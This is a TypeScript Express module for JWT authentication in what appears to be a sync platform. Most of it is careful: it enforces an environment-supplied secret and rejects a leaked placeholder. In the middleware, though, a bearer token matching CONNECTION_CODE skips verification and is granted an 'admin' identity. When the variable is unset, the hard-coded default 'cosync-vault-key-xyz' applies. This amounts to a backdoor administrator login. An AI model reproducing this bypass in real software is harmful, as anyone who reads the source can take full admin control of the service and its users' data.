import { Request, Response, NextFunction } from 'express';
import jwt from 'jsonwebtoken';
import { logger } from './logger';

/**
 * JWT secret is loaded strictly from the environment.
 * The server MUST refuse to boot when no secret is configured — a hard-coded
 * fallback would let anyone read the source code forge tokens for any user.
 */
function resolveJwtSecret(): string {
  const secret = process.env.JWT_SECRET;
  if (!secret || secret.length < 32) {
    throw new Error(
      'FATAL: JWT_SECRET environment variable is missing or too short (minimum 32 characters). ' +
      'Generate one with: node -e "console.log(require(\'crypto\').randomBytes(48).toString(\'hex\'))"'
    );
  }
  // Reject the previously-leaked placeholder value to prevent silent misconfiguration.
  if (secret === 'sync-platform-super-secret-key-1337') {
    throw new Error(
      'FATAL: JWT_SECRET is set to the known-leaked placeholder value. ' +
      'Replace it with a strong, randomly generated secret before starting the server.'
    );
  }
  return secret;
}

export const JWT_SECRET: string = resolveJwtSecret();
const TOKEN_EXPIRY = (process.env.JWT_EXPIRY || '24h') as string | number;

export interface UserTokenPayload {
  userId: string;
  username: string;
  color: string;
  exp?: number;
}

export function generateToken(payload: Omit<UserTokenPayload, 'exp'>): string {
  return jwt.sign(payload, JWT_SECRET, { expiresIn: TOKEN_EXPIRY } as jwt.SignOptions);
}

export function verifyToken(token: string): UserTokenPayload {
  try {
    return jwt.verify(token, JWT_SECRET) as UserTokenPayload;
  } catch (error) {
    logger.debug('JWT validation failed', { error: (error as Error).message });
    throw error;
  }
}

// Extend Request interface to support user payload
export interface AuthenticatedRequest extends Request {
  user?: UserTokenPayload;
}

export function authMiddleware(req: AuthenticatedRequest, res: Response, next: NextFunction) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Authorization header with Bearer token is required' });
  }

  const token = authHeader.split(' ')[1];

  // Accept CONNECTION_CODE as a valid token bypassing JWT check
  const connectionCode = process.env.CONNECTION_CODE || 'cosync-vault-key-xyz';
  if (token === connectionCode) {
    req.user = { userId: 'admin', username: 'Admin', color: '#000' };
    return next();
  }

  try {
    const decoded = verifyToken(token);
    req.user = decoded;
    next();
  } catch (error) {
    return res.status(401).json({ error: 'Invalid or expired authentication token' });
  }
}
